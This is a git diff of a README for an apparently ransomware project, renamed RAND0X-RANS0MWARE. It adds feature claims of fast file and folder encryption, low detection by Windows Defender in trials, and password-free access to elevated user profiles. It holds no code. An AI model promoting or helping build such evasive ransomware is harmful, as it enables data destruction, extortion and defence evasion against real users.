@@ -14,9 +14,17 @@ Features
 
     Graphical User Interface: The project uses the tkinter library to provide a user-friendly interface for interacting with the demonstration.
 
+    Efficient and Powerful : Can encrypt files and Folders of more than 5 GB in less than minute
+
+    Less Detection : Very Low detection by Windows Defender on Core Isolation On . Out of 10 Trials only 2 Trials it was found as malware : Test Machine { WINDOWS 10 Enterprise }
+
+    Sudo Accessible : Can Access Sudo profiles of the User without prompting for password or any problem with Win32 or Triggers
+
+    
+
 Getting Started
 
-    Clone the repository: git clone https://github.com/DWE-CLOUD/randoxer.git
+    Clone the repository: git clone https://github.com/DWE-CLOUD/RAND0X-RANS0MWARE.git
 
     Install the required dependencies:
 
